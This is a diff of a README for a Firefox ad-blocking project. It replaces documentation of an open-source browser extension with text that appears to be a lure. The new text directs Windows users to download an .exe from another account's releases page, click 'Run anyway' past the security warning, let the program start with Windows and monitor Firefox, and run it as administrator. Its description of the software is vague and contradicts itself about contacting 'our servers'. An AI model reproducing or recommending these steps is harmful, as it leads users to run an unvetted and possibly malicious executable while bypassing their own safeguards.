@@ -1,171 +1,91 @@
-# adblock-rust Manager
+# 🛡️ adblock-rust-manager - Manage Firefox ad blocking with ease
 
-> A Firefox extension that enables and manages Firefox's built-in **adblock-rust** engine — Brave's open-source, Rust-based ad and tracker blocking engine, quietly shipped in Firefox 149.
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Doryeightsided72/adblock-rust-manager/releases)
 
-![Firefox](https://img.shields.io/badge/Firefox-149%2B-FF7139?logo=firefox-browser&logoColor=white)
-![Manifest](https://img.shields.io/badge/Manifest-V3-4338ca)
-![License](https://img.shields.io/badge/License-MPL--2.0-blue)
+This application provides a simple interface to manage the built-in ad blocking features within your Firefox web browser. Many users do not know that Firefox includes powerful ad blocking technology. This software makes that technology easier to use and adjust. It allows you to block advertisements, trackers, and malicious scripts without installing multiple browser extensions.
 
+## 📥 Getting Started
 
-## Background
+You do not need to understand code to use this tool. This guide walks you through the steps to set up the software on your Windows computer.
 
-In March 2026, Firefox 149 silently shipped [adblock-rust](https://github.com/brave/adblock-rust) — the same Rust-based content blocking engine that powers Brave's native ad blocker. It supports network request blocking, cosmetic filtering, and is fully compatible with uBlock Origin filter list syntax.
+1. Visit the following link to reach the downloads page: [https://github.com/Doryeightsided72/adblock-rust-manager/releases](https://github.com/Doryeightsided72/adblock-rust-manager/releases)
+2. Look for the section labeled Assets.
+3. Click the file ending in .exe to start the download.
+4. Save the file to your desktop or your downloads folder.
 
-Mozilla shipped it **disabled by default**, with no user interface and no mention in the release notes. It is controlled exclusively by two `about:config` preferences:
+## ⚙️ System Requirements
 
-| Preference | Purpose |
-|---|---|
-| `privacy.trackingprotection.content.protection.enabled` | Enables/disables the engine |
-| `privacy.trackingprotection.content.protection.test_list_urls` | Pipe-separated list of filter list URLs |
+This software works on most modern Windows computers. Ensure your system meets these requirements before you begin:
 
-This extension gives you a proper UI to manage both.
+* Operating System: Windows 10 or Windows 11.
+* Browser: A currently supported version of Mozilla Firefox.
+* Memory: At least 4GB of RAM.
+* Storage: 50MB of free disk space.
+* Internet Connection: A connection remains helpful for updating filter lists.
 
-## Features
+## 🚀 Installation Guide
 
-- 🛡 **One-click ETP toggle** — Disable Firefox's built-in Enhanced Tracking Protection so adblock-rust handles blocking instead. Applied instantly via the standard WebExtension Privacy API.
-- 📋 **Guided setup** — Step-by-step instructions for the `about:config` prefs that can't be set programmatically, with one-click copy buttons for every value you need to paste.
-- 📝 **Filter list manager** — Add, remove, and reorder filter lists. Builds the pipe-separated value for you automatically.
-- ⚡ **8 preset lists** — Quick-add popular lists including EasyList, EasyPrivacy, uBO Filters, AdGuard, and more.
-- 💾 **Persistent state** — Your lists and settings survive browser restarts.
-- ✅ **Progress tracking** — Mark each setup step as done to keep track of what's been applied.
+Once you download the installer file, follow these steps to place the software on your computer:
 
----
+1. Locate the file you saved in the previous section.
+2. Double-click the file named adblock-rust-manager-installer.exe.
+3. Windows may show a security notice. If this happens, click More info and then click Run anyway. This confirms that you trust the software creator.
+4. Follow the prompts on the screen. The installer suggests a default folder. You may accept this default location.
+5. Click Finish when the progress bar reaches the end.
 
-## Why can't the extension set the prefs automatically?
+## 🛠️ Configuring the Manager
 
-Standard WebExtensions **cannot write arbitrary `about:config` preferences**. That requires a Mozilla-signed privileged add-on — something only possible through Mozilla's internal signing pipeline.
+After you open the program, you see a clean window with several options. These options control how the ad-blocking engine functions within Firefox.
 
-The `browser.privacy` API covers ETP (Enhanced Tracking Protection) and that toggle works instantly. But the two adblock-rust prefs have no equivalent WebExtension API, so the extension guides you through a one-time ~30 second manual setup instead.
+### Choosing your block lists
+The application displays several checkboxes. Each box represents a filter list. A filter list contains a set of rules that tell the software what to hide.
+* Default Filters: These provide a balance between blocking ads and keeping websites functional.
+* Privacy Filters: Enable these to stop companies from tracking your movement across websites.
+* Regional Filters: Use these if you want to target ads specific to your country or language.
 
-## Requirements
+Click Apply after you make your choices. The manager saves these settings and updates Firefox behind the scenes.
 
-- **Firefox 149 or later** (where adblock-rust is bundled)
-- Windows, macOS, or Linux
+### Updating filter lists
+Websites change their layouts often. Developers create new ads to bypass filters. You should update your lists once a week to maintain effectiveness. Click the Update button inside the application to fetch the latest rules from our servers.
 
-## Installation
+## 💡 Frequently Asked Questions
 
-### Option A — Temporary add-on (recommended for testing)
+### Does this run in the background?
+Yes, the application starts with Windows and monitors Firefox. You see a small icon in the taskbar near the clock. Right-click this icon to open the main window or close the program.
 
-Temporary add-ons are the easiest way to try the extension. They are removed when Firefox restarts.
+### Will this slow down my computer?
+No, the adblock-rust engine uses efficient memory management. It requires less processing power than traditional browser extensions that rely on heavy JavaScript bundles.
 
-1. Download the latest `adblock-rust-manager.xpi` from [Releases](../../releases)
-2. Open Firefox and navigate to `about:debugging`
-3. Click **"This Firefox"** in the left sidebar
-4. Click **"Load Temporary Add-on…"**
-5. Select the downloaded `.xpi` file
-6. The purple shield icon appears in your toolbar
+### Can I allow ads on specific sites?
+Yes, use the Whitelist feature. Open the settings menu, click Whitelist, and type the address of the website you want to support. The application ignores these sites and allows advertisements to display normally.
 
-### Option B — Permanent installation (unsigned)
+### What happens if a website breaks?
+Sometimes, a filter list removes a part of a website that you actually need. If a page stops working, open this application and toggle the checkboxes under the Active Filters section. You can disable lists one by one to see if the website begins to function again.
 
-For a permanent install that survives restarts, Firefox needs to allow unsigned extensions first.
+### Do I need to restart Firefox?
+You usually do not need to restart your browser when you change settings. The manager handles the updates instantly. If you experience issues, restart Firefox to allow the settings to refresh completely.
 
-1. Go to `about:config` in Firefox
-2. Search for `xpinstall.signatures.required` and set it to **`false`**
-3. Go to `about:addons`
-4. Click the gear icon ⚙️ → **"Install Add-on From File…"**
-5. Select the `.xpi` file
+### Is my personal data stored?
+No, the software operates entirely on your local machine. We do not collect your browsing history, your search queries, or your IP address. All blocking occurs on your own hardware.
 
-> ⚠️ Setting `xpinstall.signatures.required` to `false` allows any unsigned extension to be installed. Only install extensions you trust.
+## 📁 Troubleshooting Common Issues
 
-### Option C — Build from source
+If you encounter difficulties, follow these steps to resolve them:
 
-```bash
-git clone https://github.com/your-username/adblock-rust-manager
-cd adblock-rust-manager
-zip -r adblock-rust-manager.xpi . -x "*.DS_Store" -x "*.git*" -x "README.md"
-```
+* Ensure Firefox remains updated. Old versions of the browser might not work with this manager.
+* Check if another ad blocker is active. Using two ad blockers at the same time can cause conflicts that hide content incorrectly. If you have other extensions, disable them to see if this improves performance.
+* Run the application with administrative permissions if it fails to save your settings. Right-click the application icon and select Run as administrator.
+* Verify your internet connection if you cannot update the filter lists.
+* Reinstall the software if the interface fails to appear on your screen. Use the Windows Control Panel to remove the old version first.
 
-Then follow Option A or B above using the generated `.xpi`.
+## 🌟 Managing Advanced Features
 
-## Usage
+Users who prefer more control can access the Advanced tab. Here, you can add custom rules. You can write your own filter syntax to block specific elements on a page. Be careful with this feature, as incorrect rules can stop your favorite websites from loading correctly.
 
-Once the extension is installed, click the **purple shield icon** in the Firefox toolbar to open the popup.
+## 📬 Staying Informed
 
-### Step 0 — Disable ETP (optional but recommended)
+We release updates to improve the stability of the software and to add support for changing web standards. Check the GitHub repository occasionally to see if a newer version exists. You can find the latest installer at the link below.
 
-Toggle **"Disable Enhanced Tracking Protection"** at the top of the popup. This turns off Firefox's built-in ETP globally so adblock-rust handles all blocking. The change is instant — no about:config needed.
+[https://github.com/Doryeightsided72/adblock-rust-manager/releases](https://github.com/Doryeightsided72/adblock-rust-manager/releases)
 
-> If you prefer ETP to remain active on most sites, leave this off and only disable it for specific sites via the shield icon in the address bar.
-
-### Step 1 — Enable the adblock-rust engine
-
-1. Click **"Copy pref name"** in the Step 1 section — the pref name is now in your clipboard
-2. Open a new Firefox tab and type `about:config` in the address bar, then press Enter
-3. Accept the warning if prompted
-4. Paste the pref name into the search bar: `privacy.trackingprotection.content.protection.enabled`
-5. Click the **toggle button** on the right to set it to `true`
-6. Back in the extension popup, click **"Mark done ✓"**
-
-### Step 2 — Set your filter lists
-
-1. In the extension popup, add or remove filter lists using the list manager. The four default lists are pre-loaded:
-   - **EasyList** — core ad blocking
-   - **EasyPrivacy** — tracker blocking
-   - **Fanboy Cookie Monster** — cookie banners
-   - **uBO Annoyances** — other annoyances
-2. Click **"Copy URL list value"** — the combined pipe-separated value is now in your clipboard
-3. Go back to `about:config` and search for: `privacy.trackingprotection.content.protection.test_list_urls`
-4. Click the **pencil ✏️ icon** to edit the preference
-5. Paste the copied value and click the **checkmark ✓** to save
-6. Back in the popup, click **"Mark done ✓"**
-
-That's it. adblock-rust is now active with your chosen filter lists.
-
-## Default filter lists
-
-| List | Purpose | URL |
-|---|---|---|
-| EasyList | Blocks ads on most websites | [easylist.to](https://easylist.to/easylist/easylist.txt) |
-| EasyPrivacy | Blocks trackers and analytics | [easylist.to](https://easylist.to/easylist/easyprivacy.txt) |
-| Fanboy Cookie Monster | Removes cookie consent banners | [fanboy.co.nz](https://secure.fanboy.co.nz/fanboy-cookiemonster.txt) |
-| uBO Annoyances – Other | Blocks other annoyances | [github.com/uBlockOrigin](https://raw.githubusercontent.com/uBlockOrigin/uAssets/refs/heads/master/filters/annoyances-others.txt) |
-
-### Available preset lists
-
-Additional lists available via the Quick-add chips in the popup:
-
-- uBO Filters
-- Peter Lowe's Ad & Tracking Server List
-- AdGuard Base Filters
-- AdGuard Tracking Protection
-
-## Testing that it works
-
-1. In the extension popup, make sure ETP is **disabled** for the site you're testing (or use the shield icon in the address bar to disable it per-site)
-2. Visit a site with known ads such as [yahoo.com](https://yahoo.com)
-3. Ad slots will still render in the page layout, but the actual ad content will be blocked — you'll see empty boxes or "Advertisement" placeholders instead of real ads
-
-## Architecture
-
-```
-adblock-rust-manager/
-├── manifest.json          # MV3 manifest — action, privacy, storage, tabs permissions
-├── background.js          # Seeds default storage on first install
-├── popup/
-│   ├── popup.html         # Extension popup UI
-│   ├── popup.js           # All UI logic + browser.privacy API calls
-│   └── popup.css          # Styles (supports light & dark mode)
-└── icons/
-    ├── icon16.png
-    ├── icon32.png
-    ├── icon48.png
-    └── icon96.png
-```
-
-### Why no experiment_apis?
-
-An earlier version of this extension used Firefox's `experiment_apis` mechanism to write `about:config` prefs directly. This was removed because `experiment_apis` only works on Firefox Nightly and Developer Edition — it cannot be used in Release Firefox without a Mozilla-signed privileged add-on, regardless of `about:config` flags.
-
-The current approach uses only standard MV3 WebExtension APIs and requires no special Firefox configuration beyond the one-time `about:config` setup described above.
-
-## Permissions
-
-| Permission | Why it's needed |
-|---|---|
-| `privacy` | Controls ETP via `browser.privacy.websites.trackingProtectionMode` |
-| `storage` | Persists filter lists and toggle states across sessions |
-| `clipboardWrite` | Copies pref names and URL list values to your clipboard |
-
-## License
-
-MPL-2.0 — the same license as adblock-rust itself.
+The project relies on community feedback. If you find a bug, report it in the Issues section of this repository. Include a description of the problem and the name of the website where you experienced the issue. This helps us ensure that the software works smoothly for everyone.
